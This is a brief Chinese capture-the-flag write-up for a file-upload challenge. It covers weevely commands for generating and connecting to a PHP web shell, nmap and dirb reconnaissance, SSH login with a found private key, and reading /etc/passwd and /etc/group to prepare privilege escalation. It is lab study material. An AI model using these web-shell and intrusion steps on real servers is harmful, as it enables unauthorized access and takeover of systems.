# upload

> 题目：攻防世界

__0x00 审题__
题目没有太难，有一个上传的地方，上传一句话木马，就好了

__0x01 总结__

关于kali自带weevely的用法总览：

* weevely

```
weevely 是由python编写的，用于生成web shell，相当于Linux上的菜刀,但是只能进行php文件的编写
```

* 具体用法

```
[+] weevely 4.0.1
[!] Error: the following arguments are required: url, password

[+] Run terminal or command on the target
    weevely <URL> <password> [cmd]

[+] Recover an existing session
    weevely session <path> [cmd]

[+] Generate new agent
    weevely generate <password> <path>
```

1. 通过weevely得到一个websell

```
weevely generate <password> <.php>
```
2. 将shell传入网页目录

3. 连接网页

```
weevely <url> <.php> <password>
```

4. 官方help给了许多功能，能与mysql等窗口互通

* 关于信息探测

1. 探测靶场开放的服务及其端口

```
--nmap -sV IP 探测靶场开放的服务与服务版本
--nmap -A -v IP 探测靶场全部信息
--nmap -O IP 靶场操作系统类型与版本
```
2. 分析探测结果

观察存在的服务与他开放的端口 例如http,ssh

如果是http服务：

```
1. 直接搜索
2. 通过dirb检查服务隐藏文件
```
* 关于ssh协议

```
应用层上的基础安全协议：基于口令的安全验证（密钥）
```
密钥的利用：
```
chmod 600 id_rsa 修改权限为可读
ssh -i id_rsa 用户名@主机地址


3. 登录

```
1. 查看当前用户whoami
2. id 查看当前用户权限
3. 寻找根目录，cat flag
```
> 如果权限不够存在提权

```
查看所有用户：cat/etc/password
所有用户组：cat/etc/group
属于某些用户名的文件:find/ -user 用户名
```


